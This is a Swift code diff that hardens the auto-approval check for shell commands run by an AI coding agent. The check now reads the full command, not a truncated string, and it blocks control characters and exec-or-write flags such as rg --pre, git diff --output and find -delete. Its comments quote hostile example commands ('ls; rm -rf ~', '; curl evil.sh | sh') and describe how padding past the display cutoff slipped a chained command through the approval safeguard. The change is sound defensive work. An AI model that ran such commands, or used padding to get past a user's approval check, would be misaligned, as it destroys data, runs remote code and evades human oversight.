@@ -138,7 +138,8 @@ func buildHookServer(
 
         await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd)
 
-        if let autoDecision = shouldAutoApprove(tool: tool, hint: hint, source: source) {
+        // The safety check reads the FULL command; `hint` is display-truncated.
+        if let autoDecision = shouldAutoApprove(tool: tool, command: extractHint(from: body, limit: .max), source: source) {
             await diagLog.log(category: "approve", source: source, event: "auto-\(autoDecision.rawValue)", detail: tool)
             await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: tool, hint: hint)
             return approvalResponse(decision: autoDecision, source: source)
@@ -283,8 +284,12 @@ func approvalResponse(decision: ApprovalDecision, source: String) -> Response {
 
 private let cursorAutoApproveTools: Set<String> = ["Read", "Glob", "Grep", "LSP", "WebFetch"]
 
+// `find` and `fd` are deliberately absent: both spawn processes and delete
+// files through their own arguments (`find . -delete`, `fd -x rm {}`) without
+// needing a single shell metacharacter, so no amount of separator filtering
+// makes them safe to approve unseen.
 private let cursorSafeShellPatterns: [String] = [
-    #"^(ls|cat|head|tail|wc|find|grep|rg|fd|which|echo|pwd|date|whoami|hostname|uname)\b"#,
+    #"^(ls|cat|head|tail|wc|grep|rg|which|echo|pwd|date|whoami|hostname|uname)\b"#,
     #"^git (status|log|diff|show|branch|remote|tag)\b"#,
 ]
 
@@ -292,14 +297,43 @@ private let cursorSafeShellPatterns: [String] = [
 // dangerous command (e.g. `ls; rm -rf ~`, `cat x && curl evil | sh`, `git log > f`).
 // If any appear, the command is NOT eligible for auto-approval — it must be
 // reviewed manually.
-private let shellControlCharacters = CharacterSet(charactersIn: ";&|`$()<>\n\r")
+private let shellControlCharacters: CharacterSet = {
+    var set = CharacterSet(charactersIn: ";&|`$()<>")
+    // CLAUDE.md requires manual review for control characters. Naming only
+    // \n and \r let ESC, NUL and the rest of C0 through — an escape sequence
+    // reaches the log and the UI, and a NUL truncates the command for any
+    // downstream C consumer while the shell still runs the whole thing.
+    set.formUnion(.controlCharacters)
+    return set
+}()
 
-func shouldAutoApprove(tool: String, hint: String, source: String) -> ApprovalDecision? {
+// Flags that turn an otherwise read-only command into an exec or a write.
+// Checked separately from the allowlist because the allowlist matches the
+// command NAME, and these all live in the arguments.
+private let dangerousArgumentPatterns: [String] = [
+    #"(?:^|\s)--pre(?:=|\s|$)"#,        // rg --pre runs a preprocessor per file
+    #"(?:^|\s)--pre-glob\b"#,
+    #"(?:^|\s)--hostname-bin\b"#,       // rg runs this binary
+    #"(?:^|\s)--output(?:=|\s|$)"#,     // git diff --output=~/.zshenv
+    #"(?:^|\s)-(?:exec|execdir|ok|okdir|delete|fprint|fprintf|fls)\b"#,
+]
+
+/// Whether Cursor may run this command without showing the user a card.
+///
+/// `command` MUST be the full, untruncated command. It used to be the same
+/// 200-character string the UI displays, which meant a chain hidden past the
+/// cutoff (`ls <200 chars of padding>; curl evil.sh | sh`) was scanned as a
+/// bare `ls` and auto-approved — the separator was never in the string being
+/// checked. Display truncation and safety analysis must not share an input.
+func shouldAutoApprove(tool: String, command: String, source: String) -> ApprovalDecision? {
     guard source == "cursor" else { return nil }
     if cursorAutoApproveTools.contains(tool) { return .allow }
-    if hint.rangeOfCharacter(from: shellControlCharacters) != nil { return nil }
+    if command.rangeOfCharacter(from: shellControlCharacters) != nil { return nil }
+    for pattern in dangerousArgumentPatterns {
+        if command.range(of: pattern, options: .regularExpression) != nil { return nil }
+    }
     for pattern in cursorSafeShellPatterns {
-        if hint.range(of: pattern, options: .regularExpression) != nil {
+        if command.range(of: pattern, options: .regularExpression) != nil {
             return .allow
         }
     }
@@ -308,12 +342,18 @@ func shouldAutoApprove(tool: String, hint: String, source: String) -> ApprovalDe
 
 // MARK: - Helpers
 
-private func extractHint(from body: HookEventBody) -> String {
-    if let cmd = body.command, !cmd.isEmpty { return String(cmd.prefix(200)) }
+/// The single most relevant string in a hook payload.
+///
+/// `limit` exists so the safety path can ask for the whole command while the
+/// display path keeps its 200-character cap — passing the truncated string to
+/// `shouldAutoApprove` is what let a hidden `; curl … | sh` through.
+private func extractHint(from body: HookEventBody, limit: Int = 200) -> String {
+    func cap(_ s: String) -> String { limit == .max ? s : String(s.prefix(limit)) }
+    if let cmd = body.command, !cmd.isEmpty { return cap(cmd) }
     if let ti = body.effectiveToolInput {
-        if let desc = ti.description, !desc.isEmpty { return String(desc.prefix(200)) }
+        if let desc = ti.description, !desc.isEmpty { return cap(desc) }
         for v in [ti.command, ti.file_path, ti.path, ti.url, ti.query] {
-            if let v, !v.isEmpty { return String(v.prefix(200)) }
+            if let v, !v.isEmpty { return cap(v) }
         }
     }
     return body.message ?? ""
